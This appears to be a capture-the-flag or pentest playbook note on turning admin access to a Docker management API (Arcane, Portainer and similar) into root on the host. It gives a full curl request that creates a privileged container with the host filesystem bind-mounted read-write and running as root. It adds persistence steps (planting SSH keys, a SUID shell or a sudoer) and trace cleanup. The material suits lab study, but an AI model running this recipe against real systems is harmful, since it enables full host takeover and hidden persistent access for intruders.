# Docker Management API → Host Root (Privileged Bind-Mount Container)

Any Docker/container-management platform (Arcane, Portainer, Rancher,
Dockge, or a bare exposed Docker Engine API) that lets an authenticated
user create containers is a straight line to root on whatever host that
platform's backend process talks to — **by design, not by bug**. Admin on
the management app is equivalent to root on the Docker host the moment
container creation supports privileged mode and arbitrary bind mounts,
because the platform's own backend already has the Docker socket
permissions to do exactly that on your behalf.

Treat "admin access to a Docker management UI/API" as a root-equivalent
finding the instant you confirm container-create rights — don't keep
looking for a separate escalation bug once you have that.

## Recipe

1. Confirm you can create containers (not just view/manage existing ones).
   Most of these APIs mirror the Docker Engine API's container-create
   endpoint closely — expect `image`, `entrypoint`, `cmd`, `user`, and a
   `hostConfig` (or equivalent) block with `binds` and `privileged`.
2. Pick any image already cached locally on the host (no internet access
   needed inside these boxes — check the platform's own image-list
   endpoint first; the currently-running app's own image is almost always
   present).
3. Create the container with:
   - `hostConfig.binds: ["/:/host:rw"]` (or the platform's equivalent) —
     mounts the entire host filesystem into the container.
   - `hostConfig.privileged: true`.
   - **`user: "0:0"`** — many images default to a non-root user (e.g.
     `nobody`), which will hit permission errors reading root-owned host
     files even with `privileged: true` and the bind mount in place.
     Override explicitly.
   - **Override `entrypoint`** if the image bakes in its own (e.g. an
     init script or `rc.local`) that will silently swallow whatever `cmd`
     you supply. Set `entrypoint: ["/bin/sh", "-c"]` and put your full
     command in `cmd` to guarantee it actually runs.
4. Most of these management APIs don't expose a REST logs endpoint (logs
   are WebSocket-streamed only) — redirect command output to a file under
   the bind-mounted host path instead of trying to read container logs
   back through the API:
   ```
   cmd: ["{ id; cat /host/root/root.txt; } > /host/tmp/pwn_out.txt 2>&1"]
   ```
   Then read `/tmp/pwn_out.txt` back through whatever host-level foothold
   you already have (SSH, another shell, etc.).
5. Persist access by writing directly to `/host/root/.ssh/authorized_keys`
   (or planting a SUID shell, adding a sudoer, etc.) from inside the same
   privileged container — no need to keep re-authenticating to the
   management API afterward.
6. **Clean up**: delete the throwaway container(s) via the API's own
   delete/force-remove endpoint, and remove any files you wrote into
   `/tmp` or elsewhere via the bind mount. Confirm via the container-list
   endpoint that only legitimate, pre-existing containers remain.

## Generic request shape (Arcane-flavored example)
```bash
curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "http://<target>:<port>/api/environments/<env-id>/containers" -d '{
    "name": "pwn",
    "image": "<any-locally-cached-image>",
    "user": "0:0",
    "entrypoint": ["/bin/sh","-c"],
    "cmd": ["{ id; cat /host/root/root.txt; } > /host/tmp/pwn_out.txt 2>&1"],
    "hostConfig": {"binds": ["/:/host:rw"], "privileged": true}
  }'
```
Check whether the platform auto-starts newly created containers (Arcane
does — no separate `/start` call needed, confirmed via `"status":"running"`
in the create response itself) before assuming you need an extra step.

## Seen on
- [[kobold]] — Arcane v1.13.0 admin access (obtained via unrelated
  credential reuse, not an Arcane bug) → privileged container with
  `/:/host:rw` and `user: "0:0"` → instant host root.
